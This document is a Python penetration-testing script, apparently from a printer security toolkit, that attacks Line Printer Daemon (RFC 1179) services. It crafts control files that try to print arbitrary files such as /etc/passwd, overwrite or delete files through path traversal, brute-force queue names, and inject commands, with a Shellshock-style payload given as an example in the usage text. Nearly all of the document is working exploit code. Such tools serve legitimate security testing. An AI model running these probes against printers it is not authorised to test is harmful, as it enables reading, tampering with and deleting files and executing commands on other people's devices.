#!/usr/bin/env python3
# -*- coding: utf-8 -*-

########################################################################
############## [ test for flaws in lpd implementations ] ###############
########################################################################

# Some notes and ideas:
#
# - the 'f' command could be omitted to save paper, based on
#   the unsafe assumption that control file is parsed anyway
#
# - some network printers completele ignore the control file
#
# - maybe have fun with the 'S' command (symbolic link data)
#
# - for buffer overflow tests, the length of the control or
#   data file can be set to a value lower that what's sent;
#   control lines containing \x00 might also be interesting
#
# - for 'get' mode, we are currently only using 'f' command;
#   other data file formats (=interpreters?) might be tried:
#   '1','2','3','4','c','d','g','k','l','n','o','r','t','v'
#
# - for 'put' mode, hostname could also be set to file name
#   (instead of leaving empty) as it is automatically added
#   to files in the spool dir by BSD 4.4 lpd); worth a shot

# python standard library
import sys
import socket
import argparse

# ----------------------------------------------------------------------


def usage():
    parser = argparse.ArgumentParser(
        description="Line Printer Daemon Protocol (RFC 1179) Test.",
        prog="lpdtest",
        epilog='''example usage:
        lpdtest printer get /etc/passwd
        lpdtest printer put ../../etc/passwd
        lpdtest printer rm /some/file/on/printer
        lpdtest printer in '() {:;}; ping -c1 1.2.3.4'
        lpdtest printer mail lpdtest@mailhost.local
        lpdtest printer brute ./printerLdpList.txt --port 1234 ''',
        formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("hostname", help="printer ip address or hostname")
    parser.add_argument("--port", type=int,
                        help="printer port", default=515)
    parser.add_argument('mode', choices=['get', 'put', 'rm', 'in', 'mail', 'brute'],
                        help="select lpd proto security test")
    parser.add_argument('argument', help="specific to test, see examples")

    return parser.parse_args()

# ----------------------------------------------------------------------


# parse args
args = usage()

# ----------------------------------------------------------------------

# get lpd acknowledgement


def check_acknowledgement():
    if s.recv(4096) != b"\000":
        print("Negative acknowledgement")
        s.send(b"\001\n")  # [ RFC 1179 | 6.1 01 - Abort job ]
        s.close()
        sys.exit()


# ----------------------------------------------------------------------

queue = "lp"  # see https://www.brooksnet.com/content/faq-lpd-queue-names-network-print-servers


def getFilequeueList(aFilename):
    filequeueList = []
    try:
        f = open(aFilename, 'r')
        while True:
            line = f.readline()
            if not line:
                break
            filequeueList.append(line.strip("\n"))
        f.close()

    except Exception as e:
        print(("Error Open file: ", aFilename))

    return filequeueList


# ----------------------------------------------------------------------

ctrl = ""
data = "Print job from lpd test '" + args.mode \
    + "' and argument '" + args.argument + "'."

delname = srcfile = jobtitle = jobname = classname = mailname = None
hostname = ""      # leave it blank by default so nothing is added
username = "root"  # special user-name indicates a privileged user
ctrlfile = "cfA001"  # default name of control file
datafile = "dfA001"  # default name of data file
getname = datafile  # default name of file to print
# default name of file to bruteforce Queue Name
bruteQueueNameFile = "printer.txt"

# --------[ Test scenarios: get, put, del, in, mail ]-------------------

if args.mode == 'get':
    getname = args.argument
    data += " If you can read this, the test failed."
    print("[get] Trying to print file " + args.argument)

elif args.mode == 'put':
    ctrlfile = args.argument
    datafile = args.argument
    print("[put] Trying to write to file " + args.argument)

elif args.mode == 'rm':
    delname = args.argument
    print("[rm] Trying to delete file " + args.argument)

elif args.mode == 'in':
    hostname = username = ctrlfile = datafile = delname = jobname \
             = srcfile = jobtitle = classname = mailname = args.argument
    print("[in] Trying to send user input '" + args.argument + "'")

elif args.mode == 'mail':
    try:
        mailname = args.argument.split('@', 1)[0]
        hostname = args.argument.split('@', 1)[1]
    except Exception as e:
        print("Bad argument" + str(e))
        sys.exit()
    print("[mail] Trying to send job information to " + args.argument)

elif args.mode == 'brute':
    bruteQueueNameFile = args.argument
    print("[brute] Trying to brute force queue file " + args.argument)

# --------[ RFC 1179 | 6.2 02 - Receive control file ]------------------

if hostname:
    # [ RFC 1179 | 7.2 H  - Host name | max. 31 bytes ]
    ctrl += 'H' + hostname+"\n"
if username:
    # [ RFC 1179 | 7.8 P  - User identification | max. 31 bytes ]
    ctrl += 'P' + username+"\n"
if delname:
    # [ RFC 1179 | 7.11 U - Unlink data file | max. 131 bytes ]
    ctrl += 'U' + delname+"\n"
if mailname:
    # [ RFC 1179 | 7.6 M  - Mail When Printed | max. 31 bytes ]
    ctrl += 'M' + mailname+"\n"
if jobname:
    # [ RFC 1179 | 7.4 J  - Job name for banner page | max. 99 bytes ]
    ctrl += 'J' + jobname+"\n"
if classname:
    # [ RFC 1179 | 7.1 C  - Class for banner page | max. 31 bytes ]
    ctrl += 'C'+classname+"\n"
if jobname or classname:
    # [ RFC 1179 | 7.5 L  - Print banner page | max. 31 bytes ]
    ctrl += 'L' + username+"\n"
if jobtitle:
    # [ RFC 1179 | 7.10 T - Title for pr | max. 79 bytes ]
    ctrl += 'T' + jobtitle+"\n"
if srcfile:
    # [ RFC 1179 | 7.7 N  - Name of source file | max. 131 bytes ]
    ctrl += 'N' + srcfile+"\n"
if jobtitle or srcfile:
    # [ RFC 1179 | 7.25 p - Print file with 'pr' format | max. 131 bytes ]
    ctrl += 'p' + srcfile+"\n"
if getname:
    # [ RFC 1179 | 7.22 l - Print file leaving control characters | max. 131 bytes ]
    ctrl += 'f' + getname+"\n"


# ----------------------------------------------------------------------

# connect to printer
s = socket.socket()
s.connect((args.hostname, args.port))

# --------[ RFC 1179 | 5.2 02 - Receive a printer job ]-----------------
if args.mode == 'brute':
    queueList = getFilequeueList(bruteQueueNameFile)
    # s.settimeout(2) #Wait 2 sec
    for queueName in queueList:
        s.send(bytes("\002"+queueName+"\n", 'utf-8'))
        # time.sleep(2)

        if s.recv(4096) != b"\000":
            s.send(b"\001\n")  # [ RFC 1179 | 6.1 01 - Abort job ]
            s.close()
            s = socket.socket()  # reopen for next attempt
            s.connect((args.hostname, args.port))
            continue

        else:
            print("Printer found:", queueName)
            break

    s.close()
    sys.exit(1)

else:
    s.send(bytes("\002"+queue+"\n", 'utf-8'))
    check_acknowledgement()

s.send(bytes("\002"+str(len(ctrl))+" "+ctrlfile+"\n", 'utf-8'))
check_acknowledgement()
# send control file || file complete indicator
s.send(bytes(ctrl + "\000", 'utf-8'))
check_acknowledgement()

# --------[ RFC 1179 | 6.3 03 - Receive data file ]---------------------

s.send(bytes("\003"+str(len(data))+" "+datafile+"\n", 'utf-8'))
check_acknowledgement()
# send data file || file complete indicator
s.send(bytes(data + "\000", 'utf-8'))
check_acknowledgement()

# ---------------------------------git -------------------------------------

s.close()
